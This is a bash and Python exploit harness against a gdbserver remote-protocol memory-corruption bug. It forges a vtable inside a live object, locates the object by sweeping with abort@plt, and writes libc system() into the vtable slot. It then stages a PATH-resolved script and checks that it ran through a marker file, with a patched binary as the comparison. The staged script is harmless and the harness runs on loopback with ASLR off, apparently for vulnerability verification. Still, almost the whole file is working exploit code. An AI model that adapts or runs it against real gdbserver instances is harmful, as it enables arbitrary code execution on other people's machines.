#!/bin/bash
# Wire-only libc system() through the forged tdesc_feature vtable slot, with
# the fake-vtable offset chosen to keep the derived command name shell-safe.
#
# W140 showed that the fixed fake vtable at obj+8 makes the C string at rdi
# begin with the object's low byte + 8.  When that byte is 0x28 ('(') the
# /bin/sh -c command is syntax, not a word, so no staged file can run.  The
# vptr is OURS to choose: offsets inside the live object can serve as a fake
# vtable, and the chosen offset's low byte becomes the command's first byte.
# This harness derives the object from an abort@plt sweep, then picks the
# smallest offset whose vptr bytes form a literal shell word (verified with
# sh -n -c), and puts system() in the corresponding slot at vptr+0x10.
#
# The default offset is still +8, so a shell-safe environment reproduces the
# canonical r5_system_verify.sh payload and hash byte for byte.  Only an
# unsafe derived name changes the offset, payload length and staged name.
# No debugger; plant-started pinned plain gdbserver on loopback, ASLR off.
set -u
BIN=${1:?need plain vulnerable gdbserver binary}
FIXED=${2:?need fixed gdbserver binary}
HERE=$(cd "$(dirname "$0")" && pwd)
E="$HERE/evidence-portable"
CMD="$HERE/r5-bin-portable"
PY=/usr/bin/python3
SETARCH=/usr/bin/setarch
mkdir -p "$E" "$CMD"

LIBC=$(/usr/bin/ldd "$BIN" | /usr/bin/grep libc.so.6 | /usr/bin/awk '{print $3}')
BASE=$($SETARCH -R /usr/bin/ldd "$BIN" | /usr/bin/grep libc.so.6 | /usr/bin/grep -oE '0x[0-9a-f]+')
OFF=$($PY -c 'import subprocess,sys; out=subprocess.check_output(["nm","-D",sys.argv[1]],text=True); print(next(l.split()[0] for l in out.splitlines() if " system@@" in l))' "$LIBC")
SYSADDR=$((BASE + 16#$OFF))
SYSHEX=$($PY -c 'import sys; print(int(sys.argv[1]).to_bytes(8,"little").hex())' "$SYSADDR")
echo "LIBC=$LIBC BASE=$BASE OFFSET=$OFF SYSTEM=0x$(printf %x "$SYSADDR") SLOT_HEX=$SYSHEX"

ABORT_HEX=701f565555550000
OLDLEN=${#PATH}
NEWPATH="$CMD:$(printf 'A%.0s' $(seq 1 $((OLDLEN-${#CMD}-1))))"
[ ${#NEWPATH} -eq "$OLDLEN" ] || { echo "PATH length mismatch"; exit 2; }

PORT=36540
VHEX=
SLOT_HEX=$ABORT_HEX
N=64
payload() {
  local pad=$((N-40-${#SLOT_HEX}/2))
  [ "$pad" -ge 0 ] || return 1
  printf '41%.0s' {1..24}
  printf '6100000000000000'
  printf '%s' "$VHEX"
  printf '42%.0s' $(seq 1 "$pad")
  printf '%s' "$SLOT_HEX"
}
start_and_probe() {
  local bin=$1 payload_hex=$2 slen=$3 log=$4 out=$5
  PORT=$((PORT+1))
  env PATH="$NEWPATH" "$SETARCH" -R "$bin" --once --debug=remote \
    "127.0.0.1:$PORT" /bin/true >"$log" 2>&1 &
  local s=$!
  for _ in $(seq 1 100); do
    /usr/bin/grep -q 'Listening on port' "$log" 2>/dev/null && break
    /bin/sleep 0.1
  done
  $PY "$HERE/live_probe_hex.py" "$PORT" "$payload_hex" "$slen" >"$out" 2>&1
  wait "$s"
  return $?
}

# Phase 1: sweep the fixed +8 layout with abort@plt; the string at rdi is
# irrelevant to abort, so this works even when +8 would be shell-unsafe.
OBJ=
for n in $(seq 0 12); do
  cand=$((0x55555561c400 + n*0x10))
  VHEX=$($PY -c 'import sys; print(int(sys.argv[1]).to_bytes(8,"little").hex())' $((cand+8)))
  SLOT_HEX=$ABORT_HEX
  N=64
  start_and_probe "$BIN" "$(payload)" 1 \
    "$E/p-system-sweep-$n.log" "$E/p-system-sweep-$n.client.out"
  rc=$?
  echo "sweep obj=0x$(printf %x "$cand") rc=$rc"
  if [ "$rc" = 134 ]; then OBJ=$cand; break; fi
done
[ -n "$OBJ" ] || { echo "FAIL no object address produced SIGABRT"; exit 1; }
echo "DERIVED obj=0x$(printf %x "$OBJ")"

# Phase 2: choose the fake-vtable offset.  A shell-safe +8 keeps the
# canonical payload exactly; otherwise try +0x10, +0x18, ... and accept the
# first vptr whose bytes are a literal shell word.  The slot at vptr+0x10
# lands at payload offset 56+delta, so N grows with the chosen offset;
# delta 0x30 gives N=104 and writes through obj+0x47, still inside the
# live object's 0x58-byte usable chunk.
CHOICE=$($PY - "$OBJ" <<'PYEOF'
import subprocess, sys
obj = int(sys.argv[1])
for delta in (8, 0x10, 0x18, 0x20, 0x28, 0x30):
    v = obj + delta
    name = v.to_bytes(8, "little").split(b"\0", 1)[0]
    ok = bool(name) and all(
        (48 <= b <= 57) or (65 <= b <= 90) or (97 <= b <= 122)
        or b in b"_+-." or b >= 0x80 for b in name
    )
    if ok:
        ok = subprocess.run([b"/bin/sh", b"-n", b"-c", name],
                            stdin=subprocess.DEVNULL,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL).returncode == 0
    if not ok:
        sys.stderr.write("reject delta=0x%x name=%s\n" % (delta, name.hex()))
        continue
    print("%d 1 %s" % (delta, name.hex()))
    break
else:
    print("0 0 ")
PYEOF
)
DELTA=${CHOICE%% *}
REST=${CHOICE#* }
SAFE=${REST%% *}
NAME_HEX=${REST#* }
echo "CHOSEN delta=0x$(printf %x "$DELTA") SHELL_SAFE=$SAFE COMMAND_HEX=$NAME_HEX"
[ "$SAFE" = 1 ] || { echo "FAIL no shell-safe fake-vtable offset"; exit 1; }

VPTR=$((OBJ + DELTA))
VHEX=$($PY -c 'import sys; print(int(sys.argv[1]).to_bytes(8,"little").hex())' "$VPTR")
SLOT_HEX=$SYSHEX
N=$((64 + DELTA - 8))
$PY - "$CMD" "$VPTR" "$CMD/marker" <<'PYEOF'
import os, sys
d, vptr, marker = sys.argv[1].encode(), int(sys.argv[2]), sys.argv[3].encode()
name = vptr.to_bytes(8, "little").split(b"\0", 1)[0]
p = os.path.join(d, name)
with open(p, "wb") as f:
    f.write(b"#!/bin/sh\n/bin/printf 'R5_SYSTEM_MARKER=1\\n' > " + marker + b"\n")
os.chmod(p, 0o755)
PYEOF

FAIL=0
run_case() {
  local tag=$1 bin=$2 slot=$3 expect_rc=$4 expect_marker=$5 n=${6:-1} slen=${7:-1}
  local log="$E/p-system-$tag.log" out="$E/p-system-$tag.client.out"
  /bin/rm -f "$CMD/marker"
  SLOT_HEX=$slot N=$n
  local pkt
  if [ "$slen" = 16 ]; then pkt=$slot; else pkt=$(payload); fi
  start_and_probe "$bin" "$pkt" "$slen" "$log" "$out"
  local rc=$?
  local marker=0
  [ -e "$CMD/marker" ] && marker=1
  { echo "MARKER=$marker"; [ "$marker" = 1 ] && /bin/cat "$CMD/marker"; } > "$E/p-system-$tag.marker"
  if [ "$rc" = "$expect_rc" ] && [ "$marker" = "$expect_marker" ]; then
    echo "PASS $tag SERVER_RC=$rc MARKER=$marker SLOT_LEN=$n"
  else
    echo "FAIL $tag SERVER_RC=$rc EXPECT_RC=$expect_rc MARKER=$marker EXPECT_MARKER=$expect_marker"
    FAIL=$((FAIL+1))
  fi
}
run_case vuln-system "$BIN" "$SYSHEX" 0 1 "$N" 1
run_case vuln-abort  "$BIN" "$ABORT_HEX" 134 0 "$N" 1
run_case fixed-system "$FIXED" "$SYSHEX" 0 0 "$N" 1
run_case vuln-safe   "$BIN" "$(printf '43%.0s' {1..16})" 0 0 16 16
/bin/rm -f "$CMD/marker"

HASH=$(for t in vuln-system vuln-abort fixed-system vuln-safe; do
  /bin/cat "$E/p-system-$t.client.out" "$E/p-system-$t.marker"
done | /usr/bin/sha256sum | /usr/bin/cut -d' ' -f1)
echo "P_SYSTEM_NORMALIZED_HASH=$HASH"
echo "TOTAL FAIL=$FAIL"
exit "$FAIL"
